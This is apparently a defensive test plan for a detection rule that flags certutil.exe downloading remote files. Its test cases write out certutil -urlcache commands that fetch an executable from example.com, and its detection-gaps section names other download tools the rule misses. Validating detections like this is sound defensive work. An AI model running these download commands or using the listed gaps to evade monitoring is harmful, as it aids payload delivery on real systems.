# DET-007 Validation

## Objective

Validate detection of certutil.exe downloading remote content.

---

## Test Environment

- Windows 11 VM
- Sysmon
- Wazuh Agent
- Wazuh Manager
- Splunk Enterprise
- Atomic Red Team

---

## Test Cases

### Test Case 1

Command:

certutil.exe -urlcache -split -f https://example.com/file.exe file.exe

Expected Result:

Detection generated.

---

### Test Case 2

Command:

certutil.exe -urlcache -f https://example.com/file.exe file.exe

Expected Result:

Detection generated.

---

### Test Case 3

Command:

certutil.exe -store My

Expected Result:

No detection.

---

### Test Case 4

Legitimate certificate administration.

Expected Result:

No detection unless download-related flags are present.

---

## Detection Gaps

Current limitations:

- curl.exe
- bitsadmin.exe
- mshta.exe
- PowerShell downloads
- Custom download utilities

---

## Future Improvements

- Threat intelligence correlation
- Downloaded file hash analysis
- Parent process analysis
- File execution correlation

---

## Conclusion

DET-007 detects the abuse of certutil.exe for remote payload retrieval. Although certutil is a legitimate Windows utility, its use for downloading remote content is uncommon in most enterprise environments and should be investigated.